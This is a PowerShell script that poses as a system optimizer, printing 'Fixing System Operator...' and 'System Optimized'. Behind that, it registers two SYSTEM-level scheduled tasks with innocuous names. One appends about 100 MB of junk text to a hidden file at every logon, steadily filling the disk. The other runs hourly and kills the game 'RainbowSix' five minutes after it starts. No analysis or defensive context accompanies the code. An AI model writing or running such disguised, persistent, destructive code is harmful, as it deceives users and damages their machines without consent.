mkdir "C:\configWin" | out-null
mkdir "C:\configWin\assets" | out-null

$contenuto = @'
$a = "a" * 104857600 | Out-File -FilePath "C:\configWin\assets\configwind.txt" -Append
'@

$contenuto | Out-File "C:\configWin\assets\configSys.ps1"

$scriptPath = "C:\configWin\assets\configSys.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "CleanWinProcess" -Action $action -Trigger $trigger -Principal $principal | out-null

$contenuto1 = @'
$a = get-process | Where-Object {$_.ProcessName -eq "RainbowSix"}
if($a){
  Start-Sleep -Seconds 300
  Stop-Process -Name "RainbowSix"
}
'@

$contenuto1 | Out-File "C:\configWin\assets\configSysPush.ps1"

$scriptPath = "C:\configWin\assets\configSysPush.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
$triggers = @(
    New-ScheduledTaskTrigger -Daily -At "00:00",
    New-ScheduledTaskTrigger -Daily -At "01:00",
    New-ScheduledTaskTrigger -Daily -At "02:00",
    New-ScheduledTaskTrigger -Daily -At "03:00",
    New-ScheduledTaskTrigger -Daily -At "04:00",
    New-ScheduledTaskTrigger -Daily -At "05:00",
    New-ScheduledTaskTrigger -Daily -At "06:00",
    New-ScheduledTaskTrigger -Daily -At "07:00",
    New-ScheduledTaskTrigger -Daily -At "08:00",
    New-ScheduledTaskTrigger -Daily -At "09:00",
    New-ScheduledTaskTrigger -Daily -At "10:00",
    New-ScheduledTaskTrigger -Daily -At "11:00",
    New-ScheduledTaskTrigger -Daily -At "12:00",
    New-ScheduledTaskTrigger -Daily -At "13:00",
    New-ScheduledTaskTrigger -Daily -At "14:00",
    New-ScheduledTaskTrigger -Daily -At "15:00",
    New-ScheduledTaskTrigger -Daily -At "16:00",
    New-ScheduledTaskTrigger -Daily -At "17:00",
    New-ScheduledTaskTrigger -Daily -At "18:00",
    New-ScheduledTaskTrigger -Daily -At "19:00",
    New-ScheduledTaskTrigger -Daily -At "20:00",
    New-ScheduledTaskTrigger -Daily -At "21:00"
)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "CleanWinProcessPush" -Action $action -Trigger $triggers -Principal $principal | out-null

Write-Host "Fixing System Operator..." -ForegroundColor "Yellow"
Start-Sleep -Seconds 20
Write-Host "Cleanup Process..." -ForegroundColor "Yellow"
Start-Sleep -Seconds 20
Write-Host "System Optimized" -ForegroundColor "Green"
